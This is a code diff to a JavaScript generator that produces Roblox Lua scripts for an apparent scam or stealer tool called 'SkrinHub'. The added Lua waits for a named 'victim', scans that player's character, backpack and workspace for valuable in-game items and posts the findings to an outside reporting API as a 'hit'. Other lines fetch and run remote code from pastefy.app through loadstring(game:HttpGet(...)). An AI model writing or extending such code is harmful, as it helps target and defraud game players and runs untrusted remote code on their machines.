@@ -1067,32 +1067,6 @@ async function generate() {
     const brainrotLines = [...selected].map(n => `  ["${n}"] = true,`).join('\n');
     const allLines      = buildAllBrainrotsLua();
 
-    // Build selected brainrots as a Lua array for immediate reporting
-    const selectedArr = [...selected].map(n => {
-      const a = ANIMAL_MAP[n];
-      return a ? `{name="${n}",mps="${a.mps}"}` : `{name="${n}",mps="?"}`;
-    });
-    const selectedLuaArr = '{\n' + selectedArr.map(s => '  ' + s + ',').join('\n') + '\n}';
-
-    // Calculate a rough total MPS string from selected animals
-    let totalMpsNum = 0;
-    selected.forEach(n => {
-      const a = ANIMAL_MAP[n];
-      if (a) {
-        const raw = a.mps.replace(/[^\d.]/g, '');
-        const val = parseFloat(raw) || 0;
-        const unit = a.mps.toUpperCase();
-        if (unit.includes('K')) totalMpsNum += val * 1000;
-        else if (unit.includes('M')) totalMpsNum += val * 1000000;
-        else if (unit.includes('B')) totalMpsNum += val * 1000000000;
-        else totalMpsNum += val;
-      }
-    });
-    const totalMpsStr = totalMpsNum >= 1e9 ? (totalMpsNum/1e9).toFixed(1)+'B'
-      : totalMpsNum >= 1e6 ? (totalMpsNum/1e6).toFixed(1)+'M'
-      : totalMpsNum >= 1e3 ? (totalMpsNum/1e3).toFixed(1)+'K'
-      : totalMpsNum.toFixed(0);
-
     let adminPart = '';
     if (adminMode === 'admin-panel') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
     else if (adminMode === 'freeze') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
@@ -1131,15 +1105,67 @@ getgenv().SkrinReport = function(victim, brainrots, totalMps)
   end)
 end
 
--- Report hit immediately on script execution
+-- Scan victim's game data for brainrots they actually own
 task.spawn(function()
   pcall(function()
-    local hs = game:GetService("HttpService")
-    local brainrots = ${selectedLuaArr}
-    local body = hs:JSONEncode({
-      username = getgenv().TARGET_USERNAME,
-      brainrots = brainrots,
-      totalMps = "${totalMpsStr}"
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local targetName = getgenv().TARGET_USERNAME
+
+    -- Wait up to 20s for the target player to appear
+    local target = Players:FindFirstChild(targetName)
+    if not target then
+      local t0 = tick()
+      repeat task.wait(0.5) target = Players:FindFirstChild(targetName) until target or (tick()-t0 > 20)
+    end
+    if not target then return end
+
+    task.wait(3) -- let their data load
+
+    -- Collect unique matches against ALL_BRAINROTS
+    local seen = {}
+    local found = {}
+
+    local function checkName(name)
+      if seen[name] then return end
+      if getgenv().ALL_BRAINROTS[name] then
+        seen[name] = true
+        table.insert(found, {name=name, mps=getgenv().ALL_BRAINROTS[name]})
+      end
+    end
+
+    local function scanObj(obj)
+      if not obj then return end
+      pcall(function()
+        checkName(obj.Name)
+        for _, d in ipairs(obj:GetDescendants()) do
+          checkName(d.Name)
+        end
+      end)
+    end
+
+    -- Check character, backpack, and common workspace folders
+    scanObj(target.Character)
+    pcall(function() scanObj(target.Backpack) end)
+    pcall(function() scanObj(workspace:FindFirstChild(target.Name)) end)
+    pcall(function()
+      for _, folder in ipairs(workspace:GetChildren()) do
+        if folder.Name:lower():find("pet") or folder.Name:lower():find("animal") or folder.Name:lower():find("brainrot") then
+          for _, obj in ipairs(folder:GetChildren()) do
+            local owner = obj:FindFirstChild("Owner") or obj:FindFirstChild("owner")
+            if owner and (owner.Value == targetName or tostring(owner.Value) == targetName) then
+              checkName(obj.Name)
+            end
+          end
+        end
+      end
+    end)
+
+    -- Report what we found (even if empty, log the hit)
+    local body = HttpService:JSONEncode({
+      username = targetName,
+      brainrots = found,
+      totalMps = tostring(#found) .. " detected"
     })
     httpPost(getgenv().SKRINHUB_API, body)
   end)
